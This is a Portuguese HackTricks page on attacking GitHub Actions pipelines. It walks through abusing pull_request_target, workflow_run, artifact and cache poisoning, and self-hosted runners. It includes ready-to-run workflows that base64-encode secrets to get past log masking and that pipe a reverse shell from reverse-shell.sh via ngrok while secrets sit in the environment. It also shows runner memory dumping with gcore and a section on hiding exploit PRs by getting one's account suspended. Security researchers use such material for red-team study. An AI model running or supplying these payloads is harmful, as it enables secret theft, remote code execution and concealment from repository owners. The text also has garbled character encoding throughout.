# Abusando do Github Actions

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informa√ß√µes B√°sicas

Nesta p√°gina voc√™ encontrar√°:

* Um **resumo de todos os impactos** de um atacante conseguindo acessar uma Github Action
* Diferentes maneiras de **obter acesso a uma action**:
* Tendo **permiss√µes** para criar a action
* Abusando de gatilhos relacionados a **pull request**
* Abusando de **outras t√©cnicas de acesso externo**
* **Pivoteando** de um reposit√≥rio j√° comprometido
* Finalmente, uma se√ß√£o sobre **t√©cnicas de p√≥s-explora√ß√£o para abusar de uma action por dentro** (causando os impactos mencionados)

## Resumo dos Impactos

Para uma introdu√ß√£o sobre [**Github Actions, consulte as informa√ß√µes b√°sicas**](../basic-github-information.md#github-actions).

Caso voc√™ consiga **executar Github actions/arbitrariamente injetar c√≥digo** em um **reposit√≥rio**, voc√™ poderia:

* **Roubar** os **segredos** desse reposit√≥rio/organiza√ß√£o.
* Se voc√™ s√≥ pode injetar, pode roubar o que j√° est√° presente no workflow.
* Abusar dos **privil√©gios do reposit√≥rio** para acessar outras plataformas como AWS e GCP.
* **Executar c√≥digo em workers personalizados** (se workers personalizados forem usados) e tentar pivotar a partir da√≠.
* **Sobrescrever** o **c√≥digo** do reposit√≥rio.
* Isso depende dos privil√©gios do `GITHUB_TOKEN` (se houver).
* **Comprometer** **implanta√ß√µes** e outros **artefatos**.
* Se o c√≥digo estiver implantando ou armazenando algo, voc√™ poderia modificar isso e obter algum acesso adicional.

## GITHUB\_TOKEN

Este "**segredo**" (vindo de `${{ secrets.GITHUB_TOKEN }}` e `${{ github.token }}`) √© fornecido quando o administrador habilita esta op√ß√£o:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Este token √© o mesmo que uma **Aplica√ß√£o Github usar√°**, ent√£o ele pode acessar os mesmos endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
O Github deve lan√ßar um [**fluxo**](https://github.com/github/roadmap/issues/74) que **permite acesso entre reposit√≥rios** dentro do GitHub, para que um reposit√≥rio possa acessar outros reposit√≥rios internos usando o `GITHUB_TOKEN`.
{% endhint %}

Voc√™ pode ver as poss√≠veis **permiss√µes** deste token em: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Note que o token **expira ap√≥s a conclus√£o do trabalho**.\
Estes tokens parecem com isso: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algumas coisas interessantes que voc√™ pode fazer com este token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Aprovar PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Criar PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Observe que em v√°rias ocasi√µes voc√™ poder√° encontrar **tokens de usu√°rio do github dentro dos ambientes do Github Actions ou nos segredos**. Esses tokens podem conceder a voc√™ mais privil√©gios sobre o reposit√≥rio e a organiza√ß√£o.
{% endhint %}

<details>

<summary>Listar segredos na sa√≠da do Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
<details>

<summary>Obtenha shell reverso com segredos</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

√â poss√≠vel verificar as permiss√µes concedidas a um Token do Github em reposit√≥rios de outros usu√°rios **verificando os logs** das a√ß√µes:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Execu√ß√£o Permitida

{% hint style="info" %}
Esta seria a maneira mais f√°cil de comprometer as a√ß√µes do Github, pois este caso sup√µe que voc√™ tenha acesso para **criar um novo reposit√≥rio na organiza√ß√£o**, ou tenha **privil√©gios de escrita sobre um reposit√≥rio**.

Se voc√™ est√° neste cen√°rio, voc√™ pode simplesmente verificar as [t√©cnicas de P√≥s-Explora√ß√£o](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Execu√ß√£o a partir da Cria√ß√£o de Reposit√≥rio

Caso membros de uma organiza√ß√£o possam **criar novos reposit√≥rios** e voc√™ possa executar a√ß√µes do Github, voc√™ pode **criar um novo reposit√≥rio e roubar os segredos definidos no n√≠vel da organiza√ß√£o**.

### Execu√ß√£o a partir de um Novo Ramo

Se voc√™ pode **criar um novo ramo em um reposit√≥rio que j√° cont√©m uma A√ß√£o do Github** configurada, voc√™ pode **modificar** a a√ß√£o, **fazer upload** do conte√∫do e ent√£o **executar essa a√ß√£o a partir do novo ramo**. Dessa forma, voc√™ pode **exfiltrar segredos no n√≠vel do reposit√≥rio e da organiza√ß√£o** (mas voc√™ precisa saber como eles s√£o chamados).

Voc√™ pode fazer a a√ß√£o modificada execut√°vel **manualmente**, quando um **PR √© criado** ou quando **algum c√≥digo √© enviado** (dependendo de qu√£o discreto voc√™ quer ser):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Execu√ß√£o Forkada

{% hint style="info" %}
Existem diferentes gatilhos que podem permitir a um atacante **executar uma A√ß√£o do Github de outro reposit√≥rio**. Se essas a√ß√µes acion√°veis forem mal configuradas, um atacante poder√° compromet√™-las.
{% endhint %}

### `pull_request`

O gatilho de workflow **`pull_request`** executar√° o workflow toda vez que um pull request for recebido com algumas exce√ß√µes: por padr√£o, se for a **primeira vez** que voc√™ est√° **colaborando**, algum **mantenedor** precisar√° **aprovar** a **execu√ß√£o** do workflow:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Como a **limita√ß√£o padr√£o** √© para colaboradores de **primeira viagem**, voc√™ poderia contribuir **corrigindo um bug/erro de digita√ß√£o v√°lido** e depois enviar **outros PRs para abusar dos seus novos privil√©gios de `pull_request`**.

**Eu testei isso e n√£o funciona**: ~~Outra op√ß√£o seria criar uma conta com o nome de algu√©m que contribuiu para o projeto e deletou sua conta.~~
{% endhint %}

Al√©m disso, por padr√£o **previne permiss√µes de escrita** e **acesso a segredos** no reposit√≥rio alvo como mencionado nos [**documentos**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Com exce√ß√£o do `GITHUB_TOKEN`, **segredos n√£o s√£o passados para o executor** quando um workflow √© acionado a partir de um reposit√≥rio **forkado**. O **`GITHUB_TOKEN` tem permiss√µes somente de leitura** em pull requests **de reposit√≥rios forkados**.

Um atacante poderia modificar a defini√ß√£o da A√ß√£o do Github para executar coisas arbitr√°rias e anexar a√ß√µes arbitr√°rias. No entanto, ele n√£o ser√° capaz de roubar segredos ou sobrescrever o reposit√≥rio devido √†s limita√ß√µes mencionadas.

{% hint style="danger" %}
**Sim, se o atacante alterar no PR a a√ß√£o do github que ser√° acionada, sua A√ß√£o do Github ser√° a usada e n√£o a do reposit√≥rio de origem!**
{% endhint %}

Como o atacante tamb√©m controla o c√≥digo sendo executado, mesmo que n√£o haja segredos ou permiss√µes de escrita no `GITHUB_TOKEN`, um atacante poderia, por exemplo, **fazer upload de artefatos maliciosos**.

### **`pull_request_target`**

O gatilho de workflow **`pull_request_target`** tem **permiss√£o de escrita** no reposit√≥rio alvo e **acesso a segredos** (e n√£o pede permiss√£o).

Note que o gatilho de workflow **`pull_request_target`** **executa no contexto base** e n√£o no fornecido pelo PR (para **n√£o executar c√≥digo n√£o confi√°vel**). Para mais informa√ß√µes sobre `pull_request_target` [**consulte os documentos**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Al√©m disso, para mais informa√ß√µes sobre este uso espec√≠fico perigoso, confira este [**post do blog do github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Pode parecer que, porque o **workflow executado** √© o definido na **base** e **n√£o no PR**, √© **seguro** usar **`pull_request_target`**, mas h√° **alguns casos em que n√£o √©**.

E este ter√° **acesso a segredos**.

### `workflow_run`

O gatilho [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) permite executar um workflow a partir de outro quando est√° `completed`, `requested` ou `in_progress`.

Neste exemplo, um workflow √© configurado para ser executado ap√≥s a conclus√£o do workflow separado "Run Tests":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Al√©m disso, de acordo com a documenta√ß√£o: O workflow iniciado pelo evento `workflow_run` pode **acessar segredos e tokens de escrita, mesmo que o workflow anterior n√£o pudesse**.

Esse tipo de workflow pode ser atacado se estiver **dependendo** de um **workflow** que pode ser **acionado** por um usu√°rio externo via **`pull_request`** ou **`pull_request_target`**. Alguns exemplos vulner√°veis podem ser [**encontrados neste blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** O primeiro consiste no workflow acionado por **`workflow_run`** baixando o c√≥digo do atacante: `${{ github.event.pull_request.head.sha }}`\
O segundo consiste em **passar** um **artefato** do c√≥digo **n√£o confi√°vel** para o workflow **`workflow_run`** e usar o conte√∫do deste artefato de uma maneira que o torne **vulner√°vel a RCE**.

### `workflow_call`

TODO

TODO: Verificar se, quando executado a partir de um pull_request, o c√≥digo usado/baixado √© o do reposit√≥rio original ou do PR bifurcado

## Abusando da Execu√ß√£o em Forks

Mencionamos todas as maneiras pelas quais um atacante externo poderia fazer um workflow do github ser executado, agora vamos ver como essas execu√ß√µes, se mal configuradas, podem ser abusadas:

### Execu√ß√£o de checkout n√£o confi√°vel

No caso de **`pull_request`,** o workflow ser√° executado no **contexto do PR** (ent√£o ele executar√° o c√≥digo **malicioso do PR**), mas algu√©m precisa **autoriz√°-lo primeiro** e ele ser√° executado com algumas [limita√ß√µes](./#pull_request).

No caso de um workflow usando **`pull_request_target` ou `workflow_run`** que depende de um workflow que pode ser acionado a partir de **`pull_request_target` ou `pull_request`**, o c√≥digo do reposit√≥rio original ser√° executado, ent√£o o **atacante n√£o pode controlar o c√≥digo executado**.

{% hint style="danger" %}
No entanto, se a **a√ß√£o** tiver um **checkout expl√≠cito do PR** que ir√° **obter o c√≥digo do PR** (e n√£o da base), ele usar√° o c√≥digo controlado pelo atacante. Por exemplo (verifique a linha 12 onde o c√≥digo do PR √© baixado):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSEGURO. Fornecido apenas como exemplo.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

O c√≥digo potencialmente **n√£o confi√°vel est√° sendo executado durante `npm install` ou `npm build`** j√° que os scripts de build e pacotes referenciados s√£o controlados pelo autor do PR.

{% hint style="warning" %}
Um dork do github para procurar a√ß√µes vulner√°veis √©: `event.pull_request pull_request_target extension:yml` no entanto, existem diferentes maneiras de configurar os jobs para serem executados de forma segura, mesmo que a a√ß√£o esteja configurada de forma insegura (como usar condicionais sobre quem √© o ator que gera o PR).
{% endhint %}

### Inje√ß√µes de Script em Contexto <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Observe que existem certos [**contextos do github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cujos valores s√£o **controlados** pelo **usu√°rio** que cria o PR. Se a a√ß√£o do github estiver usando esses **dados para executar algo**, isso pode levar a **execu√ß√£o arbitr√°ria de c√≥digo:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Inje√ß√£o de Script GITHUB_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

De acordo com a documenta√ß√£o: Voc√™ pode tornar uma **vari√°vel de ambiente dispon√≠vel para quaisquer etapas subsequentes** em um job de workflow definindo ou atualizando a vari√°vel de ambiente e escrevendo isso no arquivo de ambiente **`GITHUB_ENV`**.

Se um atacante pudesse **injetar qualquer valor** dentro desta vari√°vel **env**, ele poderia injetar vari√°veis de ambiente que poderiam executar c√≥digo em etapas seguintes, como **LD_PRELOAD** ou **NODE_OPTIONS**.

Por exemplo ([**este**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) e [**este**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine um workflow que confia em um artefato carregado para armazenar seu conte√∫do dentro da vari√°vel de ambiente **`GITHUB_ENV`**. Um atacante poderia carregar algo assim para compromet√™-lo:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### A√ß√µes de Terceiros Vulner√°veis no Github

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Como mencionado em [**este post do blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), esta A√ß√£o do Github permite acessar artefatos de diferentes workflows e at√© reposit√≥rios.

O problema √© que se o par√¢metro **`path`** n√£o for definido, o artefato √© extra√≠do no diret√≥rio atual e pode sobrescrever arquivos que podem ser usados ou at√© executados posteriormente no workflow. Portanto, se o Artefato for vulner√°vel, um atacante poderia abusar disso para comprometer outros workflows que confiam no Artefato.

Exemplo de workflow vulner√°vel:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Isso poderia ser atacado com este fluxo de trabalho:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Outro Acesso Externo

### Sequestro de Reposit√≥rio de Namespace Exclu√≠do

Se uma conta alterar seu nome, outro usu√°rio poder√° registrar uma conta com esse nome ap√≥s algum tempo. Se um reposit√≥rio tinha **menos de 100 estrelas antes da mudan√ßa de nome**, o Github permitir√° que o novo usu√°rio registrado com o mesmo nome crie um **reposit√≥rio com o mesmo nome** que o exclu√≠do.

{% hint style="danger" %}
Portanto, se uma a√ß√£o estiver usando um reposit√≥rio de uma conta inexistente, ainda √© poss√≠vel que um atacante crie essa conta e comprometa a a√ß√£o.
{% endhint %}

Se outros reposit√≥rios estiverem usando **depend√™ncias desses reposit√≥rios do usu√°rio**, um atacante poder√° sequestr√°-los. Aqui voc√™ tem uma explica√ß√£o mais completa: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivoteamento de Reposit√≥rio

{% hint style="info" %}
Nesta se√ß√£o, falaremos sobre t√©cnicas que permitiriam **pivoteamento de um reposit√≥rio para outro** supondo que temos algum tipo de acesso no primeiro (verifique a se√ß√£o anterior).
{% endhint %}

### Envenenamento de Cache

Um cache √© mantido entre **execu√ß√µes de workflow na mesma branch**. O que significa que se um atacante **comprometer** um **pacote** que √© armazenado no cache e **baixado** e executado por um workflow **mais privilegiado**, ele tamb√©m poder√° **comprometer** esse workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Envenenamento de Artefato

Workflows podem usar **artefatos de outros workflows e at√© reposit√≥rios**, se um atacante conseguir **comprometer** a Github Action que **faz upload de um artefato** que √© posteriormente usado por outro workflow, ele poder√° **comprometer os outros workflows**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## P√≥s-Explora√ß√£o de uma A√ß√£o

### Acessando AWS e GCP via OIDC

Confira as seguintes p√°ginas:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Acessando segredos <a href="#accessing-secrets" id="accessing-secrets"></a>

Se voc√™ est√° injetando conte√∫do em um script, √© interessante saber como voc√™ pode acessar segredos:

* Se o segredo ou token estiver definido como uma **vari√°vel de ambiente**, ele pode ser acessado diretamente atrav√©s do ambiente usando **`printenv`**.

<details>

<summary>Listar segredos na sa√≠da da Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
<details>

<summary>Obtenha shell reverso com segredos</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Se o segredo √© usado **diretamente em uma express√£o**, o script shell gerado √© armazenado **em disco** e √© acess√≠vel.
* ```bash
cat /home/runner/work/_temp/*
```
* Para a√ß√µes JavaScript, os segredos s√£o enviados atrav√©s de vari√°veis de ambiente
* ```bash
ps axe | grep node
```
*   Para uma **a√ß√£o personalizada**, o risco pode variar dependendo de como um programa est√° usando o segredo que obteve do **argumento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abusando de executores auto-hospedados

A maneira de descobrir quais **Github Actions est√£o sendo executadas em infraestrutura n√£o-Github** √© procurar por **`runs-on: self-hosted`** no yaml de configura√ß√£o do Github Action.

Executores **auto-hospedados** podem ter acesso a informa√ß√µes **extremamente sens√≠veis**, a outros **sistemas de rede** (pontos finais vulner√°veis na rede? servi√ßo de metadados?) ou, mesmo que esteja isolado e destru√≠do, **mais de uma a√ß√£o pode ser executada ao mesmo tempo** e a maliciosa poderia **roubar os segredos** da outra.

Em executores auto-hospedados tamb√©m √© poss√≠vel obter os **segredos do processo **_**Runner.Listener**_** que conter√° todos os segredos dos fluxos de trabalho em qualquer etapa, despejando sua mem√≥ria:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Confira [**este post para mais informa√ß√µes**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro de Imagens Docker do Github

√â poss√≠vel criar a√ß√µes do Github que **constroem e armazenam uma imagem Docker dentro do Github**.\
Um exemplo pode ser encontrado no seguinte expans√≠vel:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como voc√™ p√¥de ver no c√≥digo anterior, o registro do Github est√° hospedado em **`ghcr.io`**.

Um usu√°rio com permiss√µes de leitura sobre o reposit√≥rio poder√° ent√£o baixar a Imagem Docker usando um token de acesso pessoal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Ent√£o, o usu√°rio poderia procurar por **segredos vazados nas camadas da imagem Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informa√ß√µes sens√≠veis nos logs do Github Actions

Mesmo que o **Github** tente **detectar valores secretos** nos logs das actions e **evitar mostr√°-los**, **outros dados sens√≠veis** que podem ter sido gerados na execu√ß√£o da action n√£o ser√£o ocultados. Por exemplo, um JWT assinado com um valor secreto n√£o ser√° ocultado, a menos que seja [configurado especificamente](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Cobrindo seus Rastros

(T√©cnica de [**aqui**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Primeiramente, qualquer PR criado √© claramente vis√≠vel ao p√∫blico no Github e para a conta do GitHub alvo. No Github, por padr√£o, **n√£o podemos deletar um PR da internet**, mas h√° um truque. Para contas do Github que s√£o **suspensas** pelo Github, todos os seus **PRs s√£o automaticamente deletados** e removidos da internet. Ent√£o, para esconder sua atividade, voc√™ precisa fazer com que sua **conta do GitHub seja suspensa ou sinalizada**. Isso **ocultar√° todas as suas atividades** no GitHub da internet (basicamente remover√° todos os seus PRs de explora√ß√£o)

Uma organiza√ß√£o no GitHub √© muito proativa em reportar contas para o GitHub. Tudo o que voc√™ precisa fazer √© compartilhar "algumas coisas" em Issue e eles garantir√£o que sua conta seja suspensa em 12 horas :p e l√° voc√™ tem, tornou seu exploit invis√≠vel no github.

{% hint style="warning" %}
A √∫nica maneira de uma organiza√ß√£o descobrir que foi alvo √© verificar os logs do GitHub a partir do SIEM, j√° que pelo UI do GitHub o PR seria removido.
{% endhint %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
